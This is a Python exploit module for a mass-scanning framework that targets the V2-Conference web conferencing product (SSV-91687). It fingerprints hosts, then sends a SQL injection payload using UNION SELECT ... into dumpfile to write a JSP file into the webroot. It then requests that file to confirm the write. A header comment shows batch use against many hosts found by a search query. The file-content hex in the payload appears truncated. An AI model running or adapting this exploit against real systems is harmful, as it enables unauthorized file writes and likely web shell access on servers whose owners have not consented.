# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-10 16:10

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# python3 batch.py -m exploit.scripts.Meeting.v2Conference.sql_inject -cs -fs "app=\"V2-Conference\""


class Script(BaseScript):
    name = 'V2-Conference'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.SQLINJECTION
        # 编号
        self.bug_number = 'SSV-91687'
        # 来源
        self.bug_refer = 'https://www.seebug.org/vuldb/ssvid-91687'
        # 特定路径判断
        self.detect_path_list = ['/Conf/jsp/main/mainAction.do']
        # exec
        self.exec_path_list = ['/Conf/jsp/systembulletin/bulletinAction.do?operator=modify&sysId=1%20UNION%20SELECT%201,2,3,4,0xinto%20dumpfile%20%27../../management/webapps/root/V2ConferenceCmd.jsp%27%23']
        # 相关信息
        self.info = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'V2 Conference' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                url = f'http://{self.target}/V2ConferenceCmd.jsp' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/V2ConferenceCmd.jsp'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'It works' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}
